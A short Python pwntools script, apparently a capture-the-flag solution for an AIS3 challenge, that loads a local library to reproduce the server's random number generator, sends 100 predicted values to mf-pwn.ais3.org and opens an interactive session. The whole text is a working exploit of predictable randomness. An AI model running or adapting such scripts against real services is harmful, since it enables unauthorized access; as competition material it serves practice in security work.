from pwn import *
from ctypes import *

my_func = cdll.LoadLibrary("./c_dll.so")
r = remote('mf-pwn.ais3.org', 7777)

my_func.initialize()
for _ in range(100):
    r.sendlineafter(':', str(my_func.get_rand()))

r.interactive()
